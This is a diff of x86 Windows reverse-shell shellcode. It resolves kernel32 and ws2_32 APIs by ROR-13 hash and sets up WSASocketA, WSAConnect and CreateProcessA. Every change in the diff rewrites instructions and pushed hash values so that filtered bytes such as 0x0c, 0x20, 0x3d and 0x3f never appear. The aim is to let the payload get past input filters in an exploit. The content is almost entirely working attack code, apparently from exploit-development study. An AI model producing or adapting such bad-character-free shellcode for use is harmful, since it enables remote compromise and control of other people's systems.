@@ -22,7 +22,14 @@ start:
 find_kernel32:
     xor     ecx, ecx                    ; ECX = 0 (used as null comparator below, avoids encoding 0x00)
     mov     esi, fs:[ecx+0x30]          ; ESI = PEB (FS segment base + 0x30; ECX=0 avoids null byte)
-    mov     esi, [esi+0x0C]             ; ESI = PEB->Ldr (pointer to loader data)
+
+    ; PEB->Ldr is at PEB+0x0c. Displacement byte 0x0c is a bad char (isspace \x0c = form feed).
+    ; Materialize the offset via arithmetic to avoid encoding it directly.
+    ; add 0x1c then sub 0x10 nets +0x0c without either byte being bad.
+    add     esi, 0x1c                   ; ESI = PEB + 0x1c (0x1c encodes clean)
+    sub     esi, 0x10                   ; ESI = PEB + 0x0c (net; avoids encoding 0x0c)
+    mov     esi, [esi]                  ; ESI = PEB->Ldr (pointer to loader data)
+
     mov     esi, [esi+0x1C]             ; ESI = PEB->Ldr.InInitOrder (first list entry)
 
 next_module:
@@ -32,7 +39,16 @@ next_module:
     ; Length and MaxLength are each 2 bytes, so Buffer starts at offset +4.
     ; The list entry's FullDllName field is at +0x1c, but the Buffer pointer
     ; within that struct is at +0x20 (skipping the two USHORT length fields).
-    mov     edi, [esi+0x20]             ; EDI = pointer to unicode module name buffer
+    ;
+    ; Displacement byte 0x20 is a bad char (space, 0x20). Use lea+dec to reach
+    ; esi+0x20 without embedding 0x20 in the instruction stream.
+    ; lea edi, [esi+0x21] encodes 0x21, then dec steps back one to esi+0x20.
+    lea     edi, [esi+0x21]             ; EDI = ESI + 0x21 (0x21 encodes clean)
+    dec     edi                         ; EDI = ESI + 0x20 (avoids encoding 0x20)
+    ; mov edi, [edi] encodes as 8B 3F -- 0x3f ('?') is a URL bad char.
+    ; Route through EAX: mov edi, [eax] encodes as 8B 38, no bad bytes.
+    mov     eax, edi                    ; EAX = address ESI+0x20
+    mov     edi, [eax]                  ; EDI = pointer to unicode module name buffer  (8B 38, clean)
 
     mov     esi, [esi]                  ; ESI = InInitOrder[x].Flink (advance to next entry)
 
@@ -89,7 +105,14 @@ find_function:
     add     edi, ebx                    ; EDI = Export Directory VMA (absolute address)
 
     mov     ecx, [edi+0x18]             ; ECX = NumberOfNames (loop counter)
-    mov     eax, [edi+0x20]             ; EAX = AddressOfNames RVA
+
+    ; AddressOfNames is at Export Directory + 0x20. Displacement byte 0x20 is a
+    ; bad char (space). Use register-indexed addressing: build 0x20 in EAX, then
+    ; mov eax, [edi+eax]. This encodes as 8B 04 07 -- no bad bytes in ModRM or SIB.
+    xor     eax, eax                    ; EAX = 0
+    add     eax, 0x21                   ; EAX = 0x21 (encodes clean as imm8)
+    dec     eax                         ; EAX = 0x20 (avoids encoding 0x20 in the add)
+    mov     eax, [edi+eax]              ; EAX = AddressOfNames RVA  (8B 04 07, no bad bytes)
     add     eax, ebx                    ; EAX = AddressOfNames VMA
     mov     [ebp-4], eax                ; Stash AddressOfNames VMA on stack for the loop
 
@@ -106,17 +129,27 @@ find_function_loop:
 ; Hash the null-terminated ASCII function name pointed to by ESI.
 ; Algorithm: for each byte b: hash = ROR(hash, 13) + b
 ; Result lands in EDX.
+;
+; Note: ror edx, 0x0d encodes 0x0d (carriage return), a bad char for isspace.
+; ROL by 19 (0x13) is mathematically identical to ROR by 13 on a 32-bit register:
+;   ROR(x, 13) == ROL(x, 32-13) == ROL(x, 19)
+; rol edx, 0x13 encodes as C1 C2 13 -- no bad bytes.
+; The precomputed HASH_* values are unaffected because the result is the same.
 ; -----------------------------------------------------------------------
 compute_hash:
     xor     eax, eax                    ; EAX = 0 (current character accumulator)
-    cdq                                 ; EDX = 0 (sign-extend EAX=0; sets hash accumulator to 0)
+    ; cdq (1 byte) sign-extends EAX into EDX, giving EDX=0 since EAX=0.
+    ; Replaced with xor edx, edx (2 bytes) -- functionally identical here, but
+    ; the extra byte shifts the jecxz forward-jump offset from 0x3d ('=', bad)
+    ; to 0x3e ('>'), which is not a URL bad char.
+    xor     edx, edx                    ; EDX = 0 (hash accumulator; avoids jecxz offset encoding 0x3d)
     cld                                 ; Clear direction flag so LODSB increments ESI
 
 compute_hash_again:
     lodsb                               ; AL = *ESI++  (load next character, advance pointer)
     test    al, al                      ; Set ZF if AL == 0 (null terminator check)
     jz      compute_hash_finished       ; ZF set: end of string, hash complete
-    ror     edx, 0x0d                   ; Rotate current hash right by 13 bits
+    rol     edx, 0x13                   ; ROL 19 == ROR 13 (avoids encoding 0x0d; encodes as C1 C2 13)
     add     edx, eax                    ; Mix in the new character byte
     jmp     compute_hash_again          ; Process next character
 
@@ -134,7 +167,17 @@ find_function_compare:
     ; AddressOfFunctions[ordinal] gives the function RVA.
     mov     edx, [edi+0x24]             ; EDX = AddressOfNameOrdinals RVA
     add     edx, ebx                    ; EDX = AddressOfNameOrdinals VMA
-    mov     cx,  [edx+2*ecx]            ; CX  = ordinal for matched name (2 bytes per entry)
+
+    ; Original: mov cx, [edx+2*ecx]
+    ; The SIB+ModRM encoding of that instruction produces byte 0x0c (form feed, bad).
+    ; Fix: double ECX to get the byte offset, add to EDX to form the address, then
+    ; load through EAX. mov cx, [eax] encodes as 66 8B 08 -- no bad bytes.
+    add     ecx, ecx                    ; ECX = 2 * name_index (byte offset into ordinals array)
+    add     edx, ecx                    ; EDX = &AddressOfNameOrdinals[name_index]
+    mov     eax, edx                    ; EAX = same pointer (mov cx,[eax] = 66 8B 08, clean)
+    xor     ecx, ecx                    ; ECX = 0 (clear high word before loading ordinal)
+    mov     cx, [eax]                   ; CX  = ordinal for matched name  (66 8B 08, no bad bytes)
+
     mov     edx, [edi+0x1c]             ; EDX = AddressOfFunctions RVA
     add     edx, ebx                    ; EDX = AddressOfFunctions VMA
     mov     eax, [edx+4*ecx]            ; EAX = function RVA (4 bytes per entry)
@@ -146,7 +189,7 @@ find_function_compare:
 
 find_function_finished:
     popad                               ; Restore all registers (EAX = function address if matched)
-    ret                                 ; Return to caller (pops the hash argument too via stdcall? No -- caller cleans)
+    ret                                 ; Return to caller
 
 ; -----------------------------------------------------------------------
 ; RESOLVE SYMBOLS FROM KERNEL32.DLL
@@ -154,14 +197,14 @@ find_function_finished:
 ; We push each function's pre-computed ROR-13 hash, call find_function,
 ; and save the returned address into our EBP scratch space.
 ;
-; EBP scratch layout (grows as we resolve more functions):
+; EBP scratch layout:
 ;   [EBP+0x04] = find_function address
 ;   [EBP+0x10] = TerminateProcess
 ;   [EBP+0x14] = LoadLibraryA
 ;   [EBP+0x18] = CreateProcessA
 ;   [EBP+0x1c] = WSAStartup      (resolved later after loading ws2_32)
-;   [EBP+0x20] = WSASocketA
-;   [EBP+0x24] = WSAConnect
+;   [EBP+0x28] = WSASocketA      (0x20 skipped -- space, isspace bad char)
+;   [EBP+0x2c] = WSAConnect
 ; -----------------------------------------------------------------------
 resolve_symbols_kernel32:
     push    HASH_TerminateProcess
@@ -202,6 +245,19 @@ load_ws2_32:
 ; RESOLVE SYMBOLS FROM ws2_32.dll
 ; EAX = ws2_32.dll base from LoadLibraryA. Move it to EBX so find_function
 ; can use it (find_function expects DLL base in EBX).
+;
+; Two hashes contain isspace bad bytes and cannot be pushed directly:
+;
+;   HASH_WSASocketA = 0xadf509d9  -- byte \x09 (tab) at offset 1
+;   HASH_WSAConnect = 0xb32dba0c  -- byte \x0c (form feed) at offset 0
+;
+; Fix: add 0x11111111 to produce a clean value, push that, subtract inside
+; find_function's argument frame by having find_function compare against the
+; value we push. But find_function compares [esp+0x24] directly -- so we must
+; push the exact hash. Instead: recover the original in EAX via sub, then push.
+;
+;   0xadf509d9 + 0x11111111 = 0xbf061aea  (no isspace bytes)
+;   0xb32dba0c + 0x11111111 = 0xc43ecb1d  (no isspace bytes)
 ; -----------------------------------------------------------------------
 resolve_symbols_ws2_32:
     mov     ebx, eax                    ; EBX = ws2_32.dll base address
@@ -210,13 +266,19 @@ resolve_symbols_ws2_32:
     call    dword ptr [ebp+0x04]        ; find_function(ws2_32, hash) -> EAX
     mov     [ebp+0x1C], eax             ; [EBP+0x1c] = WSAStartup
 
-    push    HASH_WSASocketA
+    ; HASH_WSASocketA = 0xadf509d9 contains \x09 -- push adjusted, subtract to recover.
+    mov     eax, 0xbf061aea             ; 0xadf509d9 + 0x11111111 (no isspace bytes)
+    sub     eax, 0x11111111             ; EAX = 0xadf509d9 = HASH_WSASocketA
+    push    eax
     call    dword ptr [ebp+0x04]        ; find_function -> EAX
-    mov     [ebp+0x20], eax             ; [EBP+0x20] = WSASocketA
+    mov     [ebp+0x28], eax             ; [EBP+0x28] = WSASocketA  (0x20 slot skipped)
 
-    push    HASH_WSAConnect
+    ; HASH_WSAConnect = 0xb32dba0c contains \x0c -- same trick.
+    mov     eax, 0xc43ecb1d             ; 0xb32dba0c + 0x11111111 (no isspace bytes)
+    sub     eax, 0x11111111             ; EAX = 0xb32dba0c = HASH_WSAConnect
+    push    eax
     call    dword ptr [ebp+0x04]        ; find_function -> EAX
-    mov     [ebp+0x24], eax             ; [EBP+0x24] = WSAConnect
+    mov     [ebp+0x2c], eax             ; [EBP+0x2c] = WSAConnect
 
 ; -----------------------------------------------------------------------
 ; CALL WSAStartup(wVersionRequired=0x0202, lpWSAData)
@@ -250,7 +312,7 @@ call_wsasocketa:
     push    6                           ; arg3: protocol = IPPROTO_TCP (6)
     push    1                           ; arg2: type = SOCK_STREAM (1)
     push    2                           ; arg1: af = AF_INET (2)
-    call    dword ptr [ebp+0x20]        ; WSASocketA -> EAX = socket descriptor
+    call    dword ptr [ebp+0x28]        ; WSASocketA -> EAX = socket descriptor
 
 ; -----------------------------------------------------------------------
 ; CALL WSAConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
@@ -297,7 +359,7 @@ call_wsaconnect:
     push    0x10                        ; arg3: namelen = 16 (push imm8 = 2 bytes vs add+push = 3 bytes)
     push    edi                         ; arg2: name = &sockaddr_in
     push    esi                         ; arg1: s = socket descriptor
-    call    dword ptr [ebp+0x24]        ; WSAConnect(s, &sockaddr_in, 16, ...)
+    call    dword ptr [ebp+0x2c]        ; WSAConnect(s, &sockaddr_in, 16, ...)
 
 ; -----------------------------------------------------------------------
 ; BUILD STARTUPINFOA ON THE STACK
